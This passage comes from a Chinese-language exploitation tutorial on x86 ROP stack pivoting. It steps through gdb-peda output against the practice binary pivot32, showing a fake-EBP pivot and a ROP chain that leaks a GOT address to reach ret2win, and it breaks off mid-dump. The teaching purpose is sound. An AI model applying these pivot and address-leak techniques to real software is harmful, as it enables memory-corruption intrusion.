gdb-peda$ b *0x0804889f
Breakpoint 1 at 0x804889f
gdb-peda$ c
Continuing.
[----------------------------------registers--------------------
---------------]
EAX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xffe7ec68 --> 0xf755cf0c --> 0x0
ESP: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
410
3.1.4 返回导向编程（ROP）（x86）
4\b\n")
EIP: 0x804889f (: leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048896 : call 0x80485b0 
0x804889b : add esp,0x10
0x804889e : nop
=> 0x804889f : leave
0x80488a0 : ret
0x80488a1 : push ebp
0x80488a2 : mov ebp,esp
0x80488a4 : sub esp,0x8
[------------------------------------stack----------------------
---------------]
0000| 0xffe7ec40 ('A' , "\f\317U\367\237\210\0
04\b\n")
0004| 0xffe7ec44 ('A' , "\f\317U\367\237\210\0
04\b\n")
0008| 0xffe7ec48 ('A' , "\f\317U\367\237\210\0
04\b\n")
0012| 0xffe7ec4c ('A' , "\f\317U\367\237\210\0
04\b\n")
0016| 0xffe7ec50 ('A' , "\f\317U\367\237\210\0
04\b\n")
0020| 0xffe7ec54 ('A' , "\f\317U\367\237\210\0
04\b\n")
0024| 0xffe7ec58 ('A' , "\f\317U\367\237\210\0
04\b\n")
0028| 0xffe7ec5c ('A' , "\f\317U\367\237\210\0
04\b\n")
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x0804889f in pwnme ()
gdb-peda$ x/10w 0xffe7ec68
0xffe7ec68: 0xf755cf0c 0x0804889f 0xf755000a
0x00000000
411
3.1.4 返回导向编程（ROP）（x86）
0xffe7ec78: 0x00000002 0x00000000 0x00000001
0xffe7ed44
0xffe7ec88: 0xf755cf10 0xf655d010
gdb-peda$ x/10w 0xf755cf0c
0xf755cf0c: 0x00000000 0x080485f0 0x080488c0
0x0804a024
0xf755cf1c: 0x080488c4 0x08048571 0x000001f7
0x080488c7
0xf755cf2c: 0x080486a3 0x0000000a
执行第一次 leave;ret 之前，我们看到 EBP 指向 fake ebp，即 0xf755cf0c ，
fake ebp 指向 主payload 的 ebp，而在 fake ebp 后面是 leave;ret 的地址
0x0804889f ，即返回地址。
执行第一次 leave：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --> 0x0
ESP: 0xffe7ec6c --> 0x804889f (: leave)
EIP: 0x80488a0 (: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x804889b : add esp,0x10
0x804889e : nop
0x804889f : leave
=> 0x80488a0 : ret
0x80488a1 : push ebp
412
3.1.4 返回导向编程（ROP）（x86）
0x80488a2 : mov ebp,esp
0x80488a4 : sub esp,0x8
0x80488a7 : call 0x80485f0 
[------------------------------------stack----------------------
---------------]
0000| 0xffe7ec6c --> 0x804889f (: leave)
0004| 0xffe7ec70 --> 0xf755000a --> 0x0
0008| 0xffe7ec74 --> 0x0
0012| 0xffe7ec78 --> 0x2
0016| 0xffe7ec7c --> 0x0
0020| 0xffe7ec80 --> 0x1
0024| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
0028| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (: jmp DWORD PTR ds:0x804a024)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
EBP 的值 0xffe7ec68 被赋值给 ESP，然后从栈中弹出 0xf755cf0c ，即 fake
ebp 并赋值给 EBP，同时 ESP+4= 0xffe7ec6c ，指向第二次的 leave。
执行第一次 ret：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --> 0x0
ESP: 0xffe7ec70 --> 0xf755000a --> 0x0
EIP: 0x804889f (: leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
413
3.1.4 返回导向编程（ROP）（x86）
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048896 : call 0x80485b0 
0x804889b : add esp,0x10
0x804889e : nop
=> 0x804889f : leave
0x80488a0 : ret
0x80488a1 : push ebp
0x80488a2 : mov ebp,esp
0x80488a4 : sub esp,0x8
[------------------------------------stack----------------------
---------------]
0000| 0xffe7ec70 --> 0xf755000a --> 0x0
0004| 0xffe7ec74 --> 0x0
0008| 0xffe7ec78 --> 0x2
0012| 0xffe7ec7c --> 0x0
0016| 0xffe7ec80 --> 0x1
0020| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
0024| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (: jmp DWORD PTR ds:0x804a024)
0028| 0xffe7ec8c --> 0xf655d010 --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x0804889f in pwnme ()
EIP= 0x804889f ，同时 ESP+4。
第二次 leave：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
414
3.1.4 返回导向编程（ROP）（x86）
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf10 --> 0x80485f0 (: jmp D
WORD PTR ds:0x804a024)
EIP: 0x80488a0 (: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x804889b : add esp,0x10
0x804889e : nop
0x804889f : leave
=> 0x80488a0 : ret
0x80488a1 : push ebp
0x80488a2 : mov ebp,esp
0x80488a4 : sub esp,0x8
0x80488a7 : call 0x80485f0 
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf10 --> 0x80485f0 (:
jmp DWORD PTR ds:0x804a024)
0004| 0xf755cf14 --> 0x80488c0 (: pop e
ax)
0008| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (: push 0x30)
0012| 0xf755cf1c --> 0x80488c4 (: mov e
ax,DWORD PTR [eax])
0016| 0xf755cf20 --> 0x8048571 (: pop ebx)
0020| 0xf755cf24 --> 0x1f7
0024| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0028| 0xf755cf2c --> 0x80486a3 (:
call eax)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
415
3.1.4 返回导向编程（ROP）（x86）
gdb-peda$ x/10w 0xf755cf10
0xf755cf10: 0x080485f0 0x080488c0 0x0804a024
0x080488c4
0xf755cf20: 0x08048571 0x000001f7 0x080488c7
0x080486a3
0xf755cf30: 0x0000000a 0x00000000
EBP 的值 0xf755cf0c 被赋值给 ESP，并将 主payload 的 ebp 赋值给 EBP，同
时 ESP+4= 0xf755cf10 ，这个值正是我们 主payload 的地址。
第二次 ret：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' , "\f\317U\367\237\210\00
4\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf14 --> 0x80488c0 (: pop eax)
EIP: 0x80485f0 (: jmp DWORD PTR
ds:0x804a024)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x80485e0 : jmp DWORD PTR ds:0x804a020
0x80485e6 : push 0x28
0x80485eb : jmp 0x8048580
=> 0x80485f0 : jmp DWORD PTR ds:0x80
4a024
| 0x80485f6 : push 0x30
| 0x80485fb : jmp 0x8048580
| 0x8048600 : jmp DWORD PTR ds:0x80
4a028
416
3.1.4 返回导向编程（ROP）（x86）
| 0x8048606 : push 0x38
|-> 0x80485f6 : push 0x30
0x80485fb : jmp 0x8048580
0x8048600 : jmp DWORD PTR
ds:0x804a028
0x8048606 : push 0x38
JUMP is taken
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf14 --> 0x80488c0 (: pop e
ax)
0004| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (: push 0x30)
0008| 0xf755cf1c --> 0x80488c4 (: mov e
ax,DWORD PTR [eax])
0012| 0xf755cf20 --> 0x8048571 (: pop ebx)
0016| 0xf755cf24 --> 0x1f7
0020| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0024| 0xf755cf2c --> 0x80486a3 (:
call eax)
0028| 0xf755cf30 --> 0xa ('\n')
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080485f0 in foothold_function@plt ()
成功跳转到 foothold_function@plt ，接下来系统通过
_dl_runtime_resolve 等步骤，将真正的地址写入到 .got.plt 中，我们构造
gadget 泄露出该地址地址，然后计算出 ret2win() 的地址，调用它，就成功
了。
地址泄露的过程：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0x54 ('T')
417
3.1.4 返回导向编程（ROP）（x86）
EBX: 0x0